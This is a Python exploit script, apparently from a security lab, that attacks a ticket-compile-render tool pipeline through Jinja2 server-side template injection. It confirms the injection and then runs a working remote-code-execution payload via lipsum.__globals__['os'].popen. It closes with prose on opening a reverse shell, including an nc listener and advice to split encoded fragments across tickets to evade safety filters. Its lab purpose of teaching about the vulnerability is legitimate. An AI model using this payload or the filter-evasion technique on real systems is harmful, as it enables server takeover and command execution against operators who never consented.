"""04_tool_chaining_ssti.py — Server-Side Template Injection through
the ticket → compile → render pipeline.

Three tools are individually well-behaved:

    update_ticket(ticket_id, content)   → just stores a string
    compile_sprint(sprint_id)           → joins every stored string
    render_report(report_data)          → renders Jinja2 over it

The vulnerability only exists when an attacker can write a ticket
that survives compile_sprint unchanged and reaches render_report. At
that point Jinja2 evaluates whatever template syntax made it through.

Three stages, escalating:

    A. Confirm SSTI · {{ 7*7 }} → 49
    B. Escalate to RCE · `id` command via lipsum.__globals__
    C. (assignment) reverse shell · split across multiple tickets

Usage:
    .venv/bin/python attacks/04_tool_chaining_ssti.py
"""

import re
import sys

from _helpers import banner, call


def main() -> int:
    # --- Stage A · classic 49 ---------------------------------------------
    banner("Stage A · confirm SSTI · {{ 7*7 }} should render as 49")
    call("update_ticket", ticket_id="SPRINT-001", content="just a normal ticket")
    call("update_ticket", ticket_id="SPRINT-EVIL", content="{{ 7*7 }}")
    sprint = call("compile_sprint", sprint_id="2026-Q1")
    report = call("render_report", report_data=sprint)
    print(report)
    if "49" not in report:
        print("✗ SSTI did not fire — verify you are running the baseline server.")
        return 1
    print("✓ SSTI confirmed.")

    # --- Stage B · RCE via lipsum.__globals__['os'].popen ------------------
    banner("Stage B · escalate to command execution via lipsum.__globals__")
    payload = "{{ lipsum.__globals__['os'].popen('id').read() }}"
    call("update_ticket", ticket_id="SPRINT-PWN", content=payload)
    sprint = call("compile_sprint", sprint_id="2026-Q1")
    report = call("render_report", report_data=sprint)
    print(report)

    m = re.search(r"uid=\d+", report)
    if m:
        print(f"✓ RCE CONFIRMED — `id` ran inside the server process: {m.group(0)}")
    else:
        print("✗ no uid=... in the report — the SSTI fired but `os` may have "
              "been blocked. Try the secure_server (which sandboxes the env), "
              "or check the Jinja2 version.")
        return 1

    # --- Stage C · reverse shell sketch -----------------------------------
    banner("Stage C · the reverse shell (assignment)")
    print("""
Stages A and B got us code execution inside the server. To turn that
into an interactive shell, you would:

  1. Start a listener on your machine:
        nc -lvnp 4444

  2. Split the reverse-shell command across multiple tickets so no
     single ticket triggers any host-side safety filter. A robust
     technique uses chr-encoded fragments and Jinja2 concatenation,
     then a final {% set ... %} block to call
     lipsum.__globals__['os'].popen.

  3. Use one final compile_sprint → render_report call to trigger
     the chain.

That escalation is left as the lab assignment. The vulnerability — a
trusted template engine on attacker-controlled data — is the same
whether the payload is `id` or a full reverse-shell pipeline.
""")
    return 0


if __name__ == "__main__":
    sys.exit(main())
